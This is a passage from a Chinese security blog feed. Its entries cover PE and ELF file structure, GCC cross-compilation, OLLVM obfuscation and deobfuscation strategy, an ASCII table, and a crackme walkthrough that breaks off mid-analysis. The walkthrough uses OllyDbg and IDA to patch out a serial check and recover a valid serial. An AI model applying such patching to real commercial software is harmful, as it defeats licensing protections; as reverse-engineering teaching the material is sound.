        <content type="html"><![CDATA[<h3 id="pe的基本概念">PE的基本概念</h3><p>PE（Portable Execute）文件是Windows下可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关，PE文件可以是任何扩展名。</p><p><strong>PE文件并不是作为单一内存映射文件被装入内存</strong>，Windows加载器（又称PE加载器）遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。PE文件的结构在磁盘和内存中是基本一样的，但在装入内存中时又不是完全复制。Windows加载器会决定加载哪些部分，哪些部分不需要加载。而且由于磁盘对齐与内存对齐的不一致，加载到内存的PE文件与磁盘上的PE文件各个部分的分布都会有差异。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261009887.png" alt="img"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261009304.png" alt="img"></p><p>PE文件至少包含两个段，即数据段和代码段。Windows NT 的应用程序有9个预定义的段，分别为 .text 、.bss 、.rdata 、.data 、.pdata 和.debug 段，这些段并不是都是必须的，当然，也可以根据需要定义更多的段（比如一些加壳程序）。</p><p>在应用程序中最常出现的段有以下6种：<br>.执行代码段，通常  .text （Microsoft）或 CODE（Borland）命名；<br>.数据段，通常以 .data 、.rdata 或 .bss（Microsoft）、DATA（Borland）命名；<br>.资源段，通常以 .rsrc命名；<br>.导出表，通常以 .edata命名；<br>.导入表，通常以 .idata命名；<br>.调试信息段，通常以 .debug命名；</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCC交叉编译</title>
      <link href="/2023/12/18/Security/binary/compile/GCC%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
      <url>/2023/12/18/Security/binary/compile/GCC%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261510710.png" alt="image-20240426151026653"></p><h1 id="gcc交叉编译">GCC交叉编译</h1><blockquote><p>使用 GCC 在单一的构建机器上来为不同的 CPU 架构交叉编译二进制文件。</p></blockquote><p>如果你是一个开发者，要创建二进制软件包，像一个 RPM、DEB、Flatpak 或 Snap 软件包，你不得不为各种不同的目标平台编译代码。典型的编译目标包括 32 位和 64 位的 x86 和 ARM。你可以在不同的物理或虚拟机器上完成你的构建，但这需要你为何几个系统。作为代替，你可以使用 GNU 编译器集合 (<a href="https://link.zhihu.com/?target=https%3A//gcc.gnu.org/">GCC</a>) 来交叉编译，在单一的构建机器上为几个不同的 CPU 架构产生二进制文件。</p><p>假设你有一个想要交叉编译的简单的掷骰子游戏。在大多数系统上，以 C 语言来编写这个相对简单，出于给添加现实的复杂性的目的，我以 C++ 语言写这个示例，所以程序依赖于一些不在 C 语言中东西 (具体来说就是 <code>iostream</code>)。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void lose (int c); </span><br><span class="line">void win (int c); </span><br><span class="line">void draw (); </span><br><span class="line"></span><br><span class="line">int main() &#123; </span><br><span class="line">  int i; </span><br><span class="line">    do &#123; </span><br><span class="line">      cout &lt;&lt; &quot;Pick a number between 1 and 20: \n&quot;; </span><br><span class="line">      cin &gt;&gt; i; </span><br><span class="line">      int c = rand ( ) % 21; </span><br><span class="line">      if (i &gt; 20) lose (c); </span><br><span class="line">      else if (i &lt; c ) lose (c); </span><br><span class="line">      else if (i &gt; c ) win (c); </span><br><span class="line">      else draw (); </span><br><span class="line">      &#125; </span><br><span class="line">      while (1==1); </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">void lose (int c ) </span><br><span class="line">  &#123; </span><br><span class="line">    cout &lt;&lt; &quot;You lose! Computer rolled &quot; &lt;&lt; c &lt;&lt; &quot;\n&quot;; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">void win (int c ) </span><br><span class="line">  &#123; </span><br><span class="line">    cout &lt;&lt; &quot;You win!! Computer rolled &quot; &lt;&lt; c &lt;&lt; &quot;\n&quot;; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">void draw ( ) </span><br><span class="line">   &#123; </span><br><span class="line">     cout &lt;&lt; &quot;What are the chances. You tied. Try again, I dare you! \n&quot;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在你的系统上使用 <code>g++</code> 命令编译它：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ g++ dice.cpp -o dice</span><br></pre></td></tr></table></figure><p>然后，运行它来确认其工作：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./dice</span><br><span class="line">Pick a number between 1 and 20:</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>你可以使用 <code>file</code> 命令来查看你刚刚生产的二进制文件的类型：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ file ./dice</span><br><span class="line">dice: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically</span><br><span class="line">linked (uses shared libs), for GNU/Linux 5.1.15, not stripped</span><br></pre></td></tr></table></figure><p>同样重要，使用 <code>ldd</code> 命令来查看它链接哪些库：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ldd dice</span><br><span class="line">linux-vdso.so.1 =&amp;gt; (0x00007ffe0d1dc000)</span><br><span class="line">libstdc++.so.6 =&amp;gt; /usr/lib/x86_64-linux-gnu/libstdc++.so.6</span><br><span class="line">(0x00007fce8410e000)</span><br><span class="line">libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(0x00007fce83d4f000)</span><br><span class="line">libm.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">(0x00007fce83a52000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fce84449000)</span><br><span class="line">libgcc_s.so.1 =&amp;gt; /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">(0x00007fce8383c000)</span><br></pre></td></tr></table></figure><p>从这些测试中，你已经确认了两件事：你刚刚运行的二进制文件是 64 位的，并且它链接的是 64 位库。</p><p>这意味着，为实现 32 位交叉编译，你必需告诉 <code>g++</code> 来：</p><ol><li>产生一个 32 位二进制文件</li><li>链接 32 位库，而不是 64 位库</li></ol><h2 id="设置你的开发环境"><strong>设置你的开发环境</strong></h2><p>为编译成 32 位二进制，你需要在你的系统上安装 32 位的库和头文件。如果你运行一个纯 64 位系统，那么，你没有 32 位的库或头文件，并且需要安装一个基础集合。最起码，你需要 C 和 C++ 库（<code>glibc</code> 和 <code>libstdc++</code>）以及 GCC 库（<code>libgcc</code>）的 32 位版本。这些软件包的名称可能在每个发行版中不同。在 Slackware 系统上，一个纯 64 位的带有 32 位兼容的发行版，可以从 <a href="https://link.zhihu.com/?target=http%3A//www.slackware.com/~alien/multilib/">Alien BOB</a> 提供的 <code>multilib</code> 软件包中获得。在 Fedora、CentOS 和 RHEL 系统上：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ yum install libstdc++-*.i686</span><br><span class="line">$ yum install glibc-*.i686</span><br><span class="line">$ yum install libgcc.i686</span><br></pre></td></tr></table></figure><p>不管你正在使用什么系统，你同样必须安装一些你工程使用的 32 位库。例如，如果你在你的工程中包含 <code>yaml-cpp</code>，那么，在编译工程前，你必需安装 <code>yaml-cpp</code> 的 32 位版本，或者，在很多系统上，安装 <code>yaml-cpp</code> 的开发软件包（例如，在 Fedora 系统上的 <code>yaml-cpp-devel</code>）。</p><p>一旦这些处理好了，编译是相当简单的：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ g++ -m32 dice.cpp -o dice32 -L /usr/lib -march=i686</span><br></pre></td></tr></table></figure><p><code>-m32</code> 标志告诉 GCC 以 32 位模式编译。<code>-march=i686</code> 选项进一步定义来使用哪种最优化类型（参考 <code>info gcc</code> 了解选项列表）。<code>-L</code> 标志设置你希望 GCC 来链接的库的路径。对于 32 位来说通常是 <code>/usr/lib</code>，不过，这依赖于你的系统是如何设置的，它可以是 <code>/usr/lib32</code>，甚至 <code>/opt/usr/lib</code>，或者任何你知道存放你的 32 位库的地方。</p><p>在代码编译后，查看你的构建的证据：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ file ./dice32</span><br><span class="line">dice: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),</span><br><span class="line">dynamically linked (uses shared libs) [...]</span><br></pre></td></tr></table></figure><p>接着，当然， <code>ldd ./dice32</code> 也会指向你的 32 位库。</p><h2 id="不同的架构"><strong>不同的架构</strong></h2><p>在 64 位相同的处理器家族上允许 GCC 做出很多关于如何编译代码的假设来编译 32 位软件。如果你需要为完全不同的处理器编译，你必需安装适当的交叉构建实用程序。安装哪种实用程序取决于你正在编译的东西。这个过程比为相同的 CPU 家族编译更复杂一点。</p><p>当你为相同处理器家族交叉编译时，你可以期待找到与 32 位库集的相同的 64 位库集，因为你的 Linux 发行版是同时维护这二者的。当为一个完全不同的架构编译时，你可能不得不穷追你的代码所需要的库。你需要的版本可能不在你的发行版的存储库中，因为你的发行版可能不为你的目标系统提供软件包，或者它不在容易到达的位置提供所有的软件包。如果你正在编译的代码是你写的，那么你可能非常清楚它的依赖关系是什么，并清楚在哪里找到它们。如果代码是你下载的，并需要编译，那么你可能不熟悉它的要求。在这种情况下，研究正确编译代码需要什么（它们通常被列在 <code>README</code> 或 <code>INSTALL</code> 文件中，当然也出现在源文件代码自身之中），然后收集需要的组件。</p><p>例如，如果你需要为 ARM 编译 C 代码，你必须首先在 Fedora 或 RHEL 上安装 <code>gcc-arm-linux-gnu</code>（32 位）或 <code>gcc-aarch64-linux-gnu</code>（64 位）；或者，在 Ubuntu 上安装 <code>arm-linux-gnueabi-gcc</code> 和 <code>binutils-arm-linux-gnueabi</code>。这提供你需要用来构建（至少）一个简单的 C 程序的命令和库。此外，你需要你的代码使用的任何库。你可以在惯常的位置（大多数系统上在 <code>/usr/include</code>）放置头文件，或者，你可以放置它们在一个你选择的目录，并使用 <code>-I</code> 选项将 GCC 指向它。</p><p>当编译时，不使用标准的 <code>gcc</code> 或 <code>g++</code> 命令。作为代替，使用你安装的 GCC 实用程序。例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ arm-linux-gnu-g++ dice.cpp \</span><br><span class="line">  -I/home/seth/src/crossbuild/arm/cpp \</span><br><span class="line">  -o armdice.bin</span><br></pre></td></tr></table></figure><p>验证你构建的内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file armdice.bin</span><br><span class="line">armdice.bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV) [...]</span><br></pre></td></tr></table></figure><h2 id="库和可交付结果"><strong>库和可交付结果</strong></h2><p>这是一个如何使用交叉编译的简单的示例。在真实的生活中，你的源文件代码可能产生的不止于一个二进制文件。虽然你可以手动管理，在这里手动管理可能不是好的正当理由。在我接下来的文章中，我将说明 GNU 自动工具，GNU 自动工具做了使你的代码可移植的大部分工作。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollvm原理</title>
      <link href="/2023/12/18/Security/binary/ollvm/ollvm%E5%8E%9F%E7%90%86/"/>
      <url>/2023/12/18/Security/binary/ollvm/ollvm%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ollvm原理">ollvm原理</h1><p>Obfuscator-LLVM</p><p>Ollvm大致可分为 bcf(虚假块), fla(控制流展开/扁平化), sub(指令膨胀), Split(基本块分割)</p><p><strong>bcf：</strong></p><p>克隆一个真实块，并随机替换其中的一些指令，然后用一个永远为真的条件建立一个分支。克隆后的块是不会被执行的。</p><p><strong>Fla：</strong></p><p>将所有的真实块使用一个switch case结构包裹起来，每个真实块执行完毕后都会重新赋值switch var，对于有分支的块会使用select指令，并跳转到switch起始代码块（分发器）上，根据switch var来执行下一个真实块。</p><p><strong>Sub：</strong></p><p>指令膨胀，将一条运算指令，替换为多条等价的运算指令。</p><p><strong>Split：</strong></p><p>利用随机数产生分割点，将一个基本块分割为两个，并使用绝对跳转连接起来。</p><p>关于ollvm具体的实现，可参考源码。</p><ol><li>指令替换 -mllvm -sub</li><li>虚假控制流 -mllvm -bcf</li><li>控制流展平 -mllvm -fla</li><li>函数（Funtions）注解</li></ol><h1 id="还原思路">还原思路</h1><p>网上有很多还原ollvm的脚本，但是只能还原特征很明显的ollvm，或者说只是debug版的ollvm。在debug版中ollvm的特征非常明显，一个分发器，和引用了这个分发器的真实块。但经过编译器优化后，分发器可能会变成多个，基本块会合并造成虚假块也可能会和真实块合并,等等。</p><p>现实情况是，你基本上碰不到简单的ollvm，所以那些东西个人感觉意义不是很大，还是需要靠自己。</p><p>谈下还原思路</p><p><strong>Bcf：</strong></p><p>Bcf块是执行不到的块，所以说当使用unicorn 跑过一遍函数后，其中没有执行到的块肯定有包括bcf块，我们只需要将它挑出来标记下就好。</p><p>但函数中可能存在分支，只跑一遍函数是无法覆盖到所有分支的，所以要想办法找到函数的所有分支。**一开始采用的是无名侠大佬的方法，当碰到csel指令时人工干预让其覆盖所有分支，但整个函数经常陷入死循环，分析过后发现虚假块的跳转也有可能使用csel指令。<strong>后来想到了在</strong>二进制漏洞挖掘中的思路fuzz（模糊测试），即变异函数的参数传递给函数，来覆盖更多的分支。**这样做也不能说能够找到函数的所有分支。影响一个函数的分支执行大概有三种情况，<mark>参数，全局变量，内部函数调用的返回值</mark>。后两种情况的话留意下模糊执行的trace应该能找到些蛛丝马迹，可能会比较麻烦。</p><p><strong>Fla</strong></p><p>这个环节会产生控制流块，我们只需要将这些块挑出来标记，找出所有的真实块，并通过模拟执行还原真实块之间的关系就好。</p><p>控制流块的剔除采用了无名侠大佬对基本块签名的方法。</p><p><strong>Sub：</strong></p><p>指令膨胀的还原，使用llvm的pass优化效果还可以，但目前一些ir翻译工具对arm64的支持不怎么样。</p><p><strong>Split：</strong></p><p>基本块分割更多是用来增加bcf和fla效果的。</p><p>总结整体思路：</p><p>1 利用模拟执行和fuzz技术，找出bcf块并剔除。</p><p>2 使用基本块签名剔除控制流块。</p><p>3 将剩余的块标记为真实块，并使用模拟执行找出对应关系。</p><p>4 根据对应关系，重构cfg。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ollvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4 ELF程序头</title>
      <link href="/2023/12/18/Security/binary/ELF/4.ELF%E7%A8%8B%E5%BA%8F%E5%A4%B4/"/>
      <url>/2023/12/18/Security/binary/ELF/4.ELF%E7%A8%8B%E5%BA%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="elf程序头">ELF程序头</h2><blockquote><p><mark>程序头表提供了二进制文件的段视图，与节头表提供的节视图相反。<mark>早前讨论过的</mark>ELF二进制文件的节视图仅适用于静态链接</mark>。相比之下，下面我们将要讨论的是段视图。在<u>将ELF二进制文件加载到进程并执行的时候，<strong>定位相关代码和数据并确定加载到虚拟内存中的内容</strong>时，操作系统和动态链接器就会用到段视图。</u></p></blockquote><p>ELF段包含零个或多个节，实际上就是把多个节捆绑成单个块。段提供的可执行视图，只有ELF二进制文件会用到它们，而非二进制文件（如可重定位对象）则用不到它们。</p><p>程序头表使用Elf64_Phdr结构体类型的程序头对段视图进行编码，每个程序头均包含清单2-11所示的字段。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956289.png" alt="image-20220924093320417" style="zoom:80%;" /><h4 id="p_type字段">p_type字段</h4><blockquote><p>p_type字段标识了段的类型，该字段的重要类型包括PT_LOAD、PT_DYNAMIC及PT_INTERP。</p></blockquote><ul><li><p>PT_LOAD类型的段会在创建进程时加载到内存中，程序头的剩余部分描述了可加载块的大小和将其加载到的地址。</p></li><li><p>通常至少有两个PT_LOAD类型的段，一个包含不可写数据节，另一个包含可写数据节。</p></li><li><p>PT_INTERP类型的段包含了.interp节，该节提供了加载二进制文件的解释器的名称。</p></li><li><p>PT_DYNAMIC类型的段包含了.dynamic节，该节告诉解释器如何解析二进制文件用于执行。</p></li></ul><h4 id="p_flags字段">p_flags字段</h4><blockquote><p>flag字段指定了段在运行时的访问权限，这里有3种重要的标志类型：PF_X、PF_W及PF_R。</p></blockquote><ul><li>PF_X标志指定该段为可执行，并且可对代段设置该位（readelf在清单2-12中的Flg列将其显示为E而 非X）。</li><li>PF_W标志表示该段为可写，并且一般只对可写数据段设置该位，而不对代码段设置该位。</li><li>最后，PF_R标志表示该段为可读，该属性在代码段和数据段都是正常情况。</li></ul><h4 id="p_offset-p_vaddr-p_paddr-p_filesz及-p_memsz字段">p_offset、p_vaddr、p_paddr、p_filesz及 p_memsz字段</h4><p>p_offset、p_vaddr及p_filesz字段类似于节头中的sh_offset、sh_addr及sh_size字段，它们分别指定了该段的起始文件偏移量、加载的虚拟地址以及段大小。对于可加载段，p_vaddr必须等于p_offset，以页面大小为模（通常为4096字节）。</p><p>tips:在某些操作系统上，可以使用p_addr字段来指定段在物理内存的哪个地址进行加载。在Linux操作系统中，该字段并未被使用且设置为零，因为<mark>操作系统在虚拟内存中执行二进制文件</mark>。</p><h4 id="p_align字段">p_align字段</h4><p>p_align字段类似于节头里的sh_addralign字段。该字段指定了 段所需的内存对齐方式（字节为单位），与sh_addralign一样，对齐 值0或1表示不需要特定的对齐方式。如果p_align未设置为0或1，则其 值必须是2的指数，并且p_vaddr必须等于p_offset模p_align。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="/2023/12/18/Security/binary/reverse/ASCII/"/>
      <url>/2023/12/18/Security/binary/reverse/ASCII/</url>
      
        <content type="html"><![CDATA[<h1 id="ascii码表">ASCII码表</h1><blockquote><p>ASCII（American Standard Code for Information Interchange，美国信息互换标准代码）是一套基于拉丁字母的字符编码，共收录了 128 个字符，用一个字节就可以存储，它等同于国际标准 ISO/IEC 646。ASCII 规范于 1967 年第一次发布，最后一次更新是在 1986 年。</p></blockquote><blockquote><p>ASCII编码范围0x00-0x7F，即十进制的0-127，定义了128个单字节字符。它包含了 33 个控制字符（具有某些特殊功能但是无法显示的字符）和 95 个可显示字符（数字、字母、符号）。国标码GB18030、国际码Unicode均兼容ASCII编码。</p></blockquote><ul><li>第一部分：ASCII非打印控制字符，0～31及127(共33个)是控制字符或通信专用字符</li><li>第二部分：ASCII打印字符，32～126(共95个)是字符(32sp是空格），其中48～57为0到9十个阿拉伯数字；65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。</li><li>第三部分：扩展ASCII打印字符，后128个称为扩展ASCII码，目前许多基于x86的系统都支持使用扩展（或“高”）ASCII。扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。</li><li>汉字编码：常用的汉字字符集有GB2312-80,GBK,Big5,unicode 等。</li></ul><p><a href="https://blog.csdn.net/hhy321/article/details/120610891">(10条消息) ASCII码对照表【2022年汇总】_爱看书的小沐的博客-CSDN博客_ascii码对照表</a></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261024505.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1 Acid burn</title>
      <link href="/2023/12/18/Security/binary/reverse/1-Acid%20burn/"/>
      <url>/2023/12/18/Security/binary/reverse/1-Acid%20burn/</url>
      
        <content type="html"><![CDATA[<h2 id="1acid-burn">1.Acid burn</h2><h3 id="寻找messagebox">寻找MessageBox</h3><p>我们的目的是找到序列号或者序列号的计算规则，分析的目标是找到正确的目标函数，再分析函数的功能。首先用onlydbg加载并调试程序，点击check it，弹出窗口，我们要去定位窗口调用的位置，因为我们需要依据这个MessageBox定位判断函数；</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019343.png" alt="image-20220925212526777"></p><p>搜索所有模块间的调用，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019346.png" alt="image-20220926091650656" style="zoom:80%;" /><p>找到MessageBoxA，在所有调用设置断点</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019360.png" alt="image-20220926091820658" style="zoom:80%;" /><p>我们可以分析出弹窗调用发生在地址0x42A1A9   call &lt;jmp.&amp;user32.MessageBoxA&gt;    ; \MessageBoxA</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019354.png" alt="image-20220926094033087" style="zoom:80%;" /><h3 id="追溯判断逻辑">追溯判断逻辑</h3><p>保留这个断点，再次运行程序，点击check it! 可以发现在右下角堆栈处找到最近一条Return语句：</p><p>0019F704  |0042FB37  返回到 Acid_bur.0042FB37 来自 Acid_bur.0042A170</p><p>右键Follow in Disassm…(反汇编跟随)，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019356.png" alt="image-20220926094953267" style="zoom:80%;" /><p>如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0042FACD  |.  E8 466CFDFF   call Acid_bur.00406718</span><br><span class="line">0042FAD2  |.  FF75 E8       push [local.6]</span><br><span class="line">0042FAD5  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  UNICODE &quot;-&quot;</span><br><span class="line">0042FADA  |.  FF75 F8       push [local.2]</span><br><span class="line">0042FADD  |.  8D45 F4       lea eax,[local.3]</span><br><span class="line">0042FAE0  |.  BA 05000000   mov edx,0x5</span><br><span class="line">0042FAE5  |.  E8 C23EFDFF   call Acid_bur.004039AC</span><br><span class="line">0042FAEA  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</span><br><span class="line">0042FAF3  |.  E8 60AFFEFF   call Acid_bur.0041AA58</span><br><span class="line">0042FAF8  |.  8B55 F0       mov edx,[local.4]</span><br><span class="line">0042FAFB  |.  8B45 F4       mov eax,[local.3]</span><br><span class="line">0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC</span><br><span class="line">0042FB03      75 1A         jnz short Acid_bur.0042FB1F</span><br><span class="line">0042FB05  |.  6A 00         push 0x0</span><br><span class="line">0042FB07  |.  B9 CCFB4200   mov ecx,Acid_bur.0042FBCC</span><br><span class="line">0042FB0C  |.  BA D8FB4200   mov edx,Acid_bur.0042FBD8</span><br><span class="line">0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FB18  |.  E8 53A6FFFF   call Acid_bur.0042A170</span><br><span class="line">0042FB1D  |.  EB 18         jmp short Acid_bur.0042FB37</span><br><span class="line">0042FB1F  |&gt;  6A 00         push 0x0</span><br><span class="line">0042FB21  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  ASCII 54,&quot;ry Again!&quot;</span><br><span class="line">0042FB26  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  ASCII 53,&quot;orry , The serial is incorect !&quot;</span><br><span class="line">0042FB2B  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FB30  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FB32  |.  E8 39A6FFFF   call Acid_bur.0042A170</span><br><span class="line">0042FB37  |&gt;  33C0          xor eax,eax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到了提示框显示的字符串，那么错误提示弹窗应该是发生在这里，注意到0x42FB1F,以及</p><p>0042FB03      75 1A         jnz short Acid_bur.0042FB1F</p><p>可以推断出jnz处的判断与弹窗关系密切，尝试将这里nop掉，并取消MessageboxA的断点，并点击check it运行；</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019358.png" alt="image-20220926095910347" style="zoom:80%;" /><p>虽然序列号是随意输入的，但依然得到了正确弹窗，说明0x42FB03就是我们找到的判断位置，恢复指令，继续分析。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019595.png" alt="image-20220926100005478" style="zoom:80%;" /><h3 id="断点调试寻找序列号">断点调试，寻找序列号</h3><p>将该位置之前的几处调用设置断点，call，继续check it，并F8单步，观察寄存器值的变化；<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019614.png" alt="image-20220926100421741"></p><p>运行到最后一个call之前，在寄存器中发现了错误的序列号和疑似正确的序列号‘CW-7954-CRACKED’，这个序列号是不是就是我们要找的呢？</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019628.png" alt="image-20220926100801994"></p><p>果然，我们尝试换用户名，会发现改序列号是变化的，是根据用户名计算的；</p><p>尝试保留序列号不变，改变用户名，会发现只要第一个字符是a，序列号永远是对的，说明改序列号是根据第一位计算出来的；</p><p>接下来去分析计算规则；</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019644.png" alt="image-20220926101020421" style="zoom:80%;" /><h3 id="分析计算规则">分析计算规则</h3><p>接下来用IDA静态分析计算规则，直接跳转到我们分析出的0x42FB03，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019740.png" alt="image-20220926102226469" style="zoom:80%;" /><p>按空格查看控制流图，发现了两处try again以及一处good job，根据汇编代码，可以得到这样的结论，</p><ul><li><p>数据段dword_43176C与4做了比较，大于4（jge）才可能到达good job！并且在输入用户名和序列号时，我们能够发现用户名长度必须大于4个字符；</p></li><li><p>并且发现了imul指令，有符号乘法，dword_431750与eax做乘法，并且赋值给了dword_431750；</p></li><li><p>接着执行了mov和add，这段代码很容易看出是将两个数加了起来，也就是乘积的结果乘以2；</p></li></ul><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019760.png" alt="image-20220925203654268" style="zoom:80%;" /><p>再次回到OD，在乘积这里每一行下断点，主要追踪EAX和dword_431750的值，运行代码check it！；</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019830.png" alt="image-20220926103855606" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019840.png" alt="image-20220926103953955" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019859.png" alt="image-20220926104041611" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019879.png" alt="image-20220926105656855" style="zoom:80%;" /><p>我们可以发现EAX的变化，abcds-&gt;0x61-&gt;0xF89-&gt;0x1F12, 